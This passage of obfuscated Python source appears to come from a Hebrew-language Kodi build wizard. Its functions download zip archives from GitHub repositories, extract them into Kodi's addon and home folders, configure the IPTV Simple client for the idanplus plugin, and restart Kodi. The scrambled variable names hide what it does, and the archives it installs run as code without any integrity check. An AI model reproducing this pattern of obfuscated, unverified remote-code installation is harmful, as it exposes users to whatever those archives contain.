                      O00OO0O000O0OO0O0 =O0O000O000OOO0000 /(time .time ()-OOO0O00OOOOO000OO )#line:5952
                      O00OO0O000O0OO0O0 =O00OO0O000O0OO0O0 /1024 #line:5953
                    else :#line:5954
                     O00OO0O000O0OO0O0 =0 #line:5955
                    O0O0O000O00OOOO0O ='KB'#line:5956
                    if O00OO0O000O0OO0O0 >=1024 :#line:5957
                       O00OO0O000O0OO0O0 =O00OO0O000O0OO0O0 /1024 #line:5958
                       O0O0O000O00OOOO0O ='MB'#line:5959
                    if O00OO0O000O0OO0O0 >0 and not O000OOOOO00O0O0OO ==100 :#line:5960
                        OOO0OOO0OO00O0O00 =(O0O0000O0000O0OO0 -O0O000O000OOO0000 )/O00OO0O000O0OO0O0 #line:5961
                    else :#line:5962
                        OOO0OOO0OO00O0O00 =0 #line:5963
                    OOO0O0OOOOO00O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0O000O0OO0O0 ,O0O0O000O00OOOO0O )#line:5964
                    OOOO0O00000OOOO0O .update (int (O000OOOOO00O0O0OO ),"Downloading "+'iptv',O000O000OOOO0O000 ,OOO0O0OOOOO00O0OO )#line:5966
              OOOOOOOO0OO0OO00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5969
              OO00O0OOO0000O0OO .close ()#line:5972
              extract .all (O0OO0OOOOO00O0OOO ,OOOOOOOO0OO0OO00O ,OOOO0O00000OOOO0O )#line:5973
              try :#line:5976
                os .remove (O0OO0OOOOO00O0OOO )#line:5977
              except :#line:5979
                pass #line:5980
              OOOO0O00000OOOO0O .close ()#line:5981
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5984
              OO0OO00000OO0OO0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5986
              O0O00O0OO0O0000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5987
              OOOOO0O00OO0O000O =xbmcgui .DialogProgress ()#line:5988
              OOOOO0O00OO0O000O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5989
              O0OO0OOOOO00O0OOO =os .path .join (O0O00O0OO0O0000OO ,'isr.zip')#line:5990
              O0OOO0OOO0OOO00O0 =urllib2 .Request (OO0OO00000OO0OO0O )#line:5991
              OOO00OO000O00OO0O =urllib2 .urlopen (O0OOO0OOO0OOO00O0 )#line:5992
              OOOO0O00000OOOO0O =xbmcgui .DialogProgress ()#line:5994
              OOOO0O00000OOOO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5995
              OOOO0O00000OOOO0O .update (0 )#line:5996
              OO00O0OOO0000O0OO =open (O0OO0OOOOO00O0OOO ,'wb')#line:5998
              try :#line:6000
                O0O0000O0000O0OO0 =OOO00OO000O00OO0O .info ().getheader ('Content-Length').strip ()#line:6001
                OOO00000O0000O000 =True #line:6002
              except AttributeError :#line:6003
                    OOO00000O0000O000 =False #line:6004
              if OOO00000O0000O000 :#line:6006
                    O0O0000O0000O0OO0 =int (O0O0000O0000O0OO0 )#line:6007
              O0O000O000OOO0000 =0 #line:6009
              OOO0O00OOOOO000OO =time .time ()#line:6010
              while True :#line:6011
                    OOO00OOOOO0OOO00O =OOO00OO000O00OO0O .read (8192 )#line:6012
                    if not OOO00OOOOO0OOO00O :#line:6013
                        sys .stdout .write ('\n')#line:6014
                        break #line:6015
                    O0O000O000OOO0000 +=len (OOO00OOOOO0OOO00O )#line:6017
                    OO00O0OOO0000O0OO .write (OOO00OOOOO0OOO00O )#line:6018
                    if not OOO00000O0000O000 :#line:6020
                        O0O0000O0000O0OO0 =O0O000O000OOO0000 #line:6021
                    if OOOO0O00000OOOO0O .iscanceled ():#line:6022
                       OOOO0O00000OOOO0O .close ()#line:6023
                       try :#line:6024
                        os .remove (O0OO0OOOOO00O0OOO )#line:6025
                       except :#line:6026
                        pass #line:6027
                       break #line:6028
                    O000OOOOO00O0O0OO =float (O0O000O000OOO0000 )/O0O0000O0000O0OO0 #line:6029
                    O000OOOOO00O0O0OO =round (O000OOOOO00O0O0OO *100 ,2 )#line:6030
                    O000O000OOOOOOO00 =O0O000O000OOO0000 /(1024 *1024 )#line:6031
                    OOOOO0O0O00OOOOOO =O0O0000O0000O0OO0 /(1024 *1024 )#line:6032
                    O000O000OOOO0O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O000OOOOOOO00 ,'teal',OOOOO0O0O00OOOOOO )#line:6033
                    if (time .time ()-OOO0O00OOOOO000OO )>0 :#line:6034
                      O00OO0O000O0OO0O0 =O0O000O000OOO0000 /(time .time ()-OOO0O00OOOOO000OO )#line:6035
                      O00OO0O000O0OO0O0 =O00OO0O000O0OO0O0 /1024 #line:6036
                    else :#line:6037
                     O00OO0O000O0OO0O0 =0 #line:6038
                    O0O0O000O00OOOO0O ='KB'#line:6039
                    if O00OO0O000O0OO0O0 >=1024 :#line:6040
                       O00OO0O000O0OO0O0 =O00OO0O000O0OO0O0 /1024 #line:6041
                       O0O0O000O00OOOO0O ='MB'#line:6042
                    if O00OO0O000O0OO0O0 >0 and not O000OOOOO00O0O0OO ==100 :#line:6043
                        OOO0OOO0OO00O0O00 =(O0O0000O0000O0OO0 -O0O000O000OOO0000 )/O00OO0O000O0OO0O0 #line:6044
                    else :#line:6045
                        OOO0OOO0OO00O0O00 =0 #line:6046
                    OOO0O0OOOOO00O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0O000O0OO0O0 ,O0O0O000O00OOOO0O )#line:6047
                    OOOO0O00000OOOO0O .update (int (O000OOOOO00O0O0OO ),"Downloading "+'iptv',O000O000OOOO0O000 ,OOO0O0OOOOO00O0OO )#line:6049
              OOOOOOOO0OO0OO00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6052
              OO00O0OOO0000O0OO .close ()#line:6055
              extract .all (O0OO0OOOOO00O0OOO ,OOOOOOOO0OO0OO00O ,OOOO0O00000OOOO0O )#line:6056
              try :#line:6057
                os .remove (O0OO0OOOOO00O0OOO )#line:6058
              except :#line:6060
                pass #line:6061
              OOOO0O00000OOOO0O .close ()#line:6062
def iptvkodi17_18 ():#line:6063
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6066
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6067
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6068
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6072
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6073
              OO0O000O00OO0OOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6075
              O000O0OO0O000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6076
              O000OOOO0O0OO0O0O =xbmcgui .DialogProgress ()#line:6077
              O000OOOO0O0OO0O0O .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6078
              O0OOOO0O00O000000 =os .path .join (O000O0OO0O000OOO0 ,'isr.zip')#line:6079
              O0O00OO00OO0O000O =urllib2 .Request (OO0O000O00OO0OOO0 )#line:6080
              O00O00OO0000000O0 =urllib2 .urlopen (O0O00OO00OO0O000O )#line:6081
              OO0O0OO0OOO00OO00 =xbmcgui .DialogProgress ()#line:6083
              OO0O0OO0OOO00OO00 .create ("Downloading","Downloading "+'iptv')#line:6084
              OO0O0OO0OOO00OO00 .update (0 )#line:6085
              OO00O0O0000OO000O =open (O0OOOO0O00O000000 ,'wb')#line:6087
              try :#line:6089
                OO00000OO00OOO00O =O00O00OO0000000O0 .info ().getheader ('Content-Length').strip ()#line:6090
                OO0O00OOOO0O0O000 =True #line:6091
              except AttributeError :#line:6092
                    OO0O00OOOO0O0O000 =False #line:6093
              if OO0O00OOOO0O0O000 :#line:6095
                    OO00000OO00OOO00O =int (OO00000OO00OOO00O )#line:6096
              O00O0000O0O00O0OO =0 #line:6098
              O0O0OO0000O0OO00O =time .time ()#line:6099
              while True :#line:6100
                    O0O000OO0O0O00OOO =O00O00OO0000000O0 .read (8192 )#line:6101
                    if not O0O000OO0O0O00OOO :#line:6102
                        sys .stdout .write ('\n')#line:6103
                        break #line:6104
                    O00O0000O0O00O0OO +=len (O0O000OO0O0O00OOO )#line:6106
                    OO00O0O0000OO000O .write (O0O000OO0O0O00OOO )#line:6107
                    if not OO0O00OOOO0O0O000 :#line:6109
                        OO00000OO00OOO00O =O00O0000O0O00O0OO #line:6110
                    if OO0O0OO0OOO00OO00 .iscanceled ():#line:6111
                       OO0O0OO0OOO00OO00 .close ()#line:6112
                       try :#line:6113
                        os .remove (O0OOOO0O00O000000 )#line:6114
                       except :#line:6115
                        pass #line:6116
                       break #line:6117
                    O00000O0O0000OO0O =float (O00O0000O0O00O0OO )/OO00000OO00OOO00O #line:6118
                    O00000O0O0000OO0O =round (O00000O0O0000OO0O *100 ,2 )#line:6119
                    OOO000O000000O000 =O00O0000O0O00O0OO /(1024 *1024 )#line:6120
                    O00O00O0000OO0000 =OO00000OO00OOO00O /(1024 *1024 )#line:6121
                    OO0O00O00O000O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO000O000000O000 ,'teal',O00O00O0000OO0000 )#line:6122
                    if (time .time ()-O0O0OO0000O0OO00O )>0 :#line:6123
                      OO000OO00OOOO0OOO =O00O0000O0O00O0OO /(time .time ()-O0O0OO0000O0OO00O )#line:6124
                      OO000OO00OOOO0OOO =OO000OO00OOOO0OOO /1024 #line:6125
                    else :#line:6126
                     OO000OO00OOOO0OOO =0 #line:6127
                    OO00000O0OO0O00O0 ='KB'#line:6128
                    if OO000OO00OOOO0OOO >=1024 :#line:6129
                       OO000OO00OOOO0OOO =OO000OO00OOOO0OOO /1024 #line:6130
                       OO00000O0OO0O00O0 ='MB'#line:6131
                    if OO000OO00OOOO0OOO >0 and not O00000O0O0000OO0O ==100 :#line:6132
                        O0O0000O0OOO0O000 =(OO00000OO00OOO00O -O00O0000O0O00O0OO )/OO000OO00OOOO0OOO #line:6133
                    else :#line:6134
                        O0O0000O0OOO0O000 =0 #line:6135
                    OO0O000OO0O00000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OO00OOOO0OOO ,OO00000O0OO0O00O0 )#line:6136
                    OO0O0OO0OOO00OO00 .update (int (O00000O0O0000OO0O ),"Downloading "+'iptv',OO0O00O00O000O0OO ,OO0O000OO0O00000O )#line:6138
              OO0OOO00O0O00O000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6141
              OO00O0O0000OO000O .close ()#line:6144
              extract .all (O0OOOO0O00O000000 ,OO0OOO00O0O00O000 ,OO0O0OO0OOO00OO00 )#line:6145
              wiz .kodi17Fix ()#line:6147
              try :#line:6149
                os .remove (O0OOOO0O00O000000 )#line:6150
              except :#line:6152
                pass #line:6153
              OO0O0OO0OOO00OO00 .close ()#line:6154
              xbmc .sleep (5000 )#line:6156
              OO0O0O00OOOOOO0O0 ='התקנת לקוח טלוויזיה חיה'#line:6158
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O00OOOOOO0O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6159
              resetkodi ()#line:6160
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6161
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6162
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6163
              OO0O000O00OO0OOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6164
              O000O0OO0O000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6165
              O000OOOO0O0OO0O0O =xbmcgui .DialogProgress ()#line:6166
              O000OOOO0O0OO0O0O .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6167
              O0OOOO0O00O000000 =os .path .join (O000O0OO0O000OOO0 ,'isr.zip')#line:6168
              O0O00OO00OO0O000O =urllib2 .Request (OO0O000O00OO0OOO0 )#line:6169
              O00O00OO0000000O0 =urllib2 .urlopen (O0O00OO00OO0O000O )#line:6170
              OO0O0OO0OOO00OO00 =xbmcgui .DialogProgress ()#line:6172
              OO0O0OO0OOO00OO00 .create ("Downloading","Downloading "+'iptv')#line:6173
              OO0O0OO0OOO00OO00 .update (0 )#line:6174
              OO00O0O0000OO000O =open (O0OOOO0O00O000000 ,'wb')#line:6176
              try :#line:6178
                OO00000OO00OOO00O =O00O00OO0000000O0 .info ().getheader ('Content-Length').strip ()#line:6179
                OO0O00OOOO0O0O000 =True #line:6180
              except AttributeError :#line:6181
                    OO0O00OOOO0O0O000 =False #line:6182
              if OO0O00OOOO0O0O000 :#line:6184
                    OO00000OO00OOO00O =int (OO00000OO00OOO00O )#line:6185
              O00O0000O0O00O0OO =0 #line:6187
              O0O0OO0000O0OO00O =time .time ()#line:6188
              while True :#line:6189
                    O0O000OO0O0O00OOO =O00O00OO0000000O0 .read (8192 )#line:6190
                    if not O0O000OO0O0O00OOO :#line:6191
                        sys .stdout .write ('\n')#line:6192
                        break #line:6193
                    O00O0000O0O00O0OO +=len (O0O000OO0O0O00OOO )#line:6195
                    OO00O0O0000OO000O .write (O0O000OO0O0O00OOO )#line:6196
                    if not OO0O00OOOO0O0O000 :#line:6198
                        OO00000OO00OOO00O =O00O0000O0O00O0OO #line:6199
                    if OO0O0OO0OOO00OO00 .iscanceled ():#line:6200
                       OO0O0OO0OOO00OO00 .close ()#line:6201
                       try :#line:6202
                        os .remove (O0OOOO0O00O000000 )#line:6203
                       except :#line:6204
                        pass #line:6205
                       break #line:6206
                    O00000O0O0000OO0O =float (O00O0000O0O00O0OO )/OO00000OO00OOO00O #line:6207
                    O00000O0O0000OO0O =round (O00000O0O0000OO0O *100 ,2 )#line:6208
                    OOO000O000000O000 =O00O0000O0O00O0OO /(1024 *1024 )#line:6209
                    O00O00O0000OO0000 =OO00000OO00OOO00O /(1024 *1024 )#line:6210
                    OO0O00O00O000O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO000O000000O000 ,'teal',O00O00O0000OO0000 )#line:6211
                    if (time .time ()-O0O0OO0000O0OO00O )>0 :#line:6212
                      OO000OO00OOOO0OOO =O00O0000O0O00O0OO /(time .time ()-O0O0OO0000O0OO00O )#line:6213
                      OO000OO00OOOO0OOO =OO000OO00OOOO0OOO /1024 #line:6214
                    else :#line:6215
                     OO000OO00OOOO0OOO =0 #line:6216
                    OO00000O0OO0O00O0 ='KB'#line:6217
                    if OO000OO00OOOO0OOO >=1024 :#line:6218
                       OO000OO00OOOO0OOO =OO000OO00OOOO0OOO /1024 #line:6219
                       OO00000O0OO0O00O0 ='MB'#line:6220
                    if OO000OO00OOOO0OOO >0 and not O00000O0O0000OO0O ==100 :#line:6221
                        O0O0000O0OOO0O000 =(OO00000OO00OOO00O -O00O0000O0O00O0OO )/OO000OO00OOOO0OOO #line:6222
                    else :#line:6223
                        O0O0000O0OOO0O000 =0 #line:6224
                    OO0O000OO0O00000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OO00OOOO0OOO ,OO00000O0OO0O00O0 )#line:6225
                    OO0O0OO0OOO00OO00 .update (int (O00000O0O0000OO0O ),"Downloading "+'iptv',OO0O00O00O000O0OO ,OO0O000OO0O00000O )#line:6227
              OO0OOO00O0O00O000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6230
              OO00O0O0000OO000O .close ()#line:6233
              extract .all (O0OOOO0O00O000000 ,OO0OOO00O0O00O000 ,OO0O0OO0OOO00OO00 )#line:6234
              wiz .kodi17Fix ()#line:6235
              try :#line:6237
                os .remove (O0OOOO0O00O000000 )#line:6238
              except :#line:6240
                pass #line:6241
              OO0O0OO0OOO00OO00 .close ()#line:6242
              xbmc .sleep (5000 )#line:6244
              OO0O0O00OOOOOO0O0 ='התקנת לקוח טלוויזיה חיה'#line:6246
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O00OOOOOO0O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6247
              resetkodi ()#line:6248
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6250
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6251
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6252
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6253
def iptvidanplus ():#line:6254
    OOO0O0O0O0OOO000O =xbmcaddon .Addon ('plugin.video.idanplus')#line:6255
    OOO0O0O0O0OOO000O .setSetting ('useIPTV','true')#line:6256
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6257
    if KODIV >=17 and KODIV <18 :#line:6260
        OO0OO0O0OO00O000O ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6262
        OO00OOO00OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6263
        OOOO000OOOOOOOO00 =xbmcgui .DialogProgress ()#line:6264
        OOOO000OOOOOOOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6265
        O0OOOOO0O0OO0OOO0 =os .path .join (PACKAGES ,'isr.zip')#line:6266
        O00O0O000O00OO0OO =urllib2 .Request (OO0OO0O0OO00O000O )#line:6267
        OOO00O0O00OO00OO0 =urllib2 .urlopen (O00O0O000O00OO0OO )#line:6268
        O0OOOOO000OOO0O00 =xbmcgui .DialogProgress ()#line:6270
        O0OOOOO000OOO0O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6271
        O0OOOOO000OOO0O00 .update (0 )#line:6272
        OOOO00O00O00O0O00 =open (O0OOOOO0O0OO0OOO0 ,'wb')#line:6274
        try :#line:6276
          O0O0OO0O00O00O00O =OOO00O0O00OO00OO0 .info ().getheader ('Content-Length').strip ()#line:6277
          OOOOOO00O0O0OOOO0 =True #line:6278
        except AttributeError :#line:6279
              OOOOOO00O0O0OOOO0 =False #line:6280
        if OOOOOO00O0O0OOOO0 :#line:6282
              O0O0OO0O00O00O00O =int (O0O0OO0O00O00O00O )#line:6283
        O0000O00OO00OO000 =0 #line:6285
        OO0OOO0O00O0000OO =time .time ()#line:6286
        while True :#line:6287
              O0OOOOO0O000O000O =OOO00O0O00OO00OO0 .read (8192 )#line:6288
              if not O0OOOOO0O000O000O :#line:6289
                  sys .stdout .write ('\n')#line:6290
                  break #line:6291
              O0000O00OO00OO000 +=len (O0OOOOO0O000O000O )#line:6293
              OOOO00O00O00O0O00 .write (O0OOOOO0O000O000O )#line:6294
              if not OOOOOO00O0O0OOOO0 :#line:6296
                  O0O0OO0O00O00O00O =O0000O00OO00OO000 #line:6297
              if O0OOOOO000OOO0O00 .iscanceled ():#line:6298
                 O0OOOOO000OOO0O00 .close ()#line:6299
                 try :#line:6300
                  os .remove (O0OOOOO0O0OO0OOO0 )#line:6301
                 except :#line:6302
                  pass #line:6303
                 break #line:6304
              OO0O00O000OO0OOOO =float (O0000O00OO00OO000 )/O0O0OO0O00O00O00O #line:6305
              OO0O00O000OO0OOOO =round (OO0O00O000OO0OOOO *100 ,2 )#line:6306
              OO0OO000O00OO0O00 =O0000O00OO00OO000 /(1024 *1024 )#line:6307
              OO0OO0O00OO00OOO0 =O0O0OO0O00O00O00O /(1024 *1024 )#line:6308
              O0O000O000OOO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO000O00OO0O00 ,'teal',OO0OO0O00OO00OOO0 )#line:6309
              if (time .time ()-OO0OOO0O00O0000OO )>0 :#line:6310
                O0OOO0O0OO0O0OOOO =O0000O00OO00OO000 /(time .time ()-OO0OOO0O00O0000OO )#line:6311
                O0OOO0O0OO0O0OOOO =O0OOO0O0OO0O0OOOO /1024 #line:6312
              else :#line:6313
               O0OOO0O0OO0O0OOOO =0 #line:6314
              O000O0O000O00OOOO ='KB'#line:6315
              if O0OOO0O0OO0O0OOOO >=1024 :#line:6316
                 O0OOO0O0OO0O0OOOO =O0OOO0O0OO0O0OOOO /1024 #line:6317
                 O000O0O000O00OOOO ='MB'#line:6318
              if O0OOO0O0OO0O0OOOO >0 and not OO0O00O000OO0OOOO ==100 :#line:6319
                  OO0OO000O0O000OO0 =(O0O0OO0O00O00O00O -O0000O00OO00OO000 )/O0OOO0O0OO0O0OOOO #line:6320
              else :#line:6321
                  OO0OO000O0O000OO0 =0 #line:6322
              OO0O0O00O00O0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO0O0OO0O0OOOO ,O000O0O000O00OOOO )#line:6323
              O0OOOOO000OOO0O00 .update (int (OO0O00O000OO0OOOO ),O0O000O000OOO00O0 ,OO0O0O00O00O0OOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6325
        O0O0OO0O00OOOO0O0 =xbmc .translatePath (os .path .join ('special://home/'))#line:6328
        OOOO00O00O00O0O00 .close ()#line:6331
        extract .all (O0OOOOO0O0OO0OOO0 ,O0O0OO0O00OOOO0O0 ,O0OOOOO000OOO0O00 )#line:6332
        try :#line:6336
          os .remove (O0OOOOO0O0OO0OOO0 )#line:6337
        except :#line:6338
          pass #line:6339
        wiz .kodi17Fix ()#line:6340
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6341
        time .sleep (10 )#line:6342
        OOO00OOOOOOOOOOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6343
        OOO00OOOOOOOOOOO0 .setSetting ('epgTimeShift','1.000000')#line:6344
        OOO00OOOOOOOOOOO0 .setSetting ('m3uPathType','0')#line:6345
        OOO00OOOOOOOOOOO0 .setSetting ('epgPathType','0')#line:6346
        OOO00OOOOOOOOOOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6347
        OOO00OOOOOOOOOOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6348
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6349
        resetkodi ()#line:6350
    if KODIV >=18 :#line:6353
        iptvkodi18idan ()#line:6355
        wiz .kodi17Fix ()#line:6356
        time .sleep (10 )#line:6358
        OOO00OOOOOOOOOOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6359
        OOO00OOOOOOOOOOO0 .setSetting ('epgTimeShift','1.000000')#line:6360
        OOO00OOOOOOOOOOO0 .setSetting ('m3uPathType','0')#line:6361
        OOO00OOOOOOOOOOO0 .setSetting ('epgPathType','0')#line:6362
        OOO00OOOOOOOOOOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6363
        OOO00OOOOOOOOOOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6364
        O0O0OOO0000000O0O ='הגדרת ערוצי עידן פלוס'#line:6365
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOO0000000O0O ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6366
        resetkodi ()#line:6367
def iptvsimpldown ():#line:6383
    O0OOOOOO00O0O000O =(IPTV18 )#line:6385
    O0OOO00O0000000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6386
    OOOO0OO000O0O0O00 =xbmcgui .DialogProgress ()#line:6387
    OOOO0OO000O0O0O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6388
    OOO0O00OO0O00O00O =os .path .join (PACKAGES ,'isr.zip')#line:6389
    O0O0000OO0O0O00O0 =urllib2 .Request (O0OOOOOO00O0O000O )#line:6390
    O00O0OOO0OO000O00 =urllib2 .urlopen (O0O0000OO0O0O00O0 )#line:6391
    OO00000000O0O0O00 =xbmcgui .DialogProgress ()#line:6393
    OO00000000O0O0O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6394
    OO00000000O0O0O00 .update (0 )#line:6395
    OOO0OO0OOOOO0OO0O =open (OOO0O00OO0O00O00O ,'wb')#line:6397
    try :#line:6399
      OOOO00O0000O00O00 =O00O0OOO0OO000O00 .info ().getheader ('Content-Length').strip ()#line:6400
      OO00OO0000OO00000 =True #line:6401
    except AttributeError :#line:6402
          OO00OO0000OO00000 =False #line:6403
    if OO00OO0000OO00000 :#line:6405
          OOOO00O0000O00O00 =int (OOOO00O0000O00O00 )#line:6406
    OO0O0000000OO0OOO =0 #line:6408
    O0OOO000OOOOO000O =time .time ()#line:6409
    while True :#line:6410
          OOO0O0OO0OOOO0000 =O00O0OOO0OO000O00 .read (8192 )#line:6411
          if not OOO0O0OO0OOOO0000 :#line:6412
              sys .stdout .write ('\n')#line:6413
              break #line:6414
          OO0O0000000OO0OOO +=len (OOO0O0OO0OOOO0000 )#line:6416
          OOO0OO0OOOOO0OO0O .write (OOO0O0OO0OOOO0000 )#line:6417
          if not OO00OO0000OO00000 :#line:6419
              OOOO00O0000O00O00 =OO0O0000000OO0OOO #line:6420
          if OO00000000O0O0O00 .iscanceled ():#line:6421
             OO00000000O0O0O00 .close ()#line:6422
             try :#line:6423
              os .remove (OOO0O00OO0O00O00O )#line:6424
             except :#line:6425
              pass #line:6426
             break #line:6427
          OOOO0O0OOO00OOOO0 =float (OO0O0000000OO0OOO )/OOOO00O0000O00O00 #line:6428
          OOOO0O0OOO00OOOO0 =round (OOOO0O0OOO00OOOO0 *100 ,2 )#line:6429
          OO000O0OOO0OO0OOO =OO0O0000000OO0OOO /(1024 *1024 )#line:6430
          O0OO00O0OOOOO0O00 =OOOO00O0000O00O00 /(1024 *1024 )#line:6431
          OOO0000O00000OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000O0OOO0OO0OOO ,'teal',O0OO00O0OOOOO0O00 )#line:6432
          if (time .time ()-O0OOO000OOOOO000O )>0 :#line:6433
            OOOOOO000OO00OOO0 =OO0O0000000OO0OOO /(time .time ()-O0OOO000OOOOO000O )#line:6434
            OOOOOO000OO00OOO0 =OOOOOO000OO00OOO0 /1024 #line:6435
          else :#line:6436
           OOOOOO000OO00OOO0 =0 #line:6437
          O0OOOO0OO0O000000 ='KB'#line:6438
          if OOOOOO000OO00OOO0 >=1024 :#line:6439
             OOOOOO000OO00OOO0 =OOOOOO000OO00OOO0 /1024 #line:6440
             O0OOOO0OO0O000000 ='MB'#line:6441
          if OOOOOO000OO00OOO0 >0 and not OOOO0O0OOO00OOOO0 ==100 :#line:6442
              O000OO0O0000OO00O =(OOOO00O0000O00O00 -OO0O0000000OO0OOO )/OOOOOO000OO00OOO0 #line:6443
          else :#line:6444
              O000OO0O0000OO00O =0 #line:6445
          OOO0O000O0OO0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOO000OO00OOO0 ,O0OOOO0OO0O000000 )#line:6446
          OO00000000O0O0O00 .update (int (OOOO0O0OOO00OOOO0 ),OOO0000O00000OOOO ,OOO0O000O0OO0OOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6448
    OOOO00O0O0000OO0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6451
    OOO0OO0OOOOO0OO0O .close ()#line:6454
    extract .all (OOO0O00OO0O00O00O ,OOOO00O0O0000OO0O ,OO00000000O0O0O00 )#line:6455
    try :#line:6459
      os .remove (OOO0O00OO0O00O00O )#line:6460
    except :#line:6461
      pass #line:6462
def telemedia_android5fix ():#line:6463
    O0OOO0O0O00O00O00 =ADDON .getSetting ('systemtype')#line:6464
    O00O000OO0000OO0O =ADDON .getSetting ('teleandro')#line:6465
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in O0OOO0O0O00O00O00 or O00O000OO0000OO0O =='true':#line:6466
        OOO00OOOOO0O00OOO ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6468
        O0O00000000OO00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6469
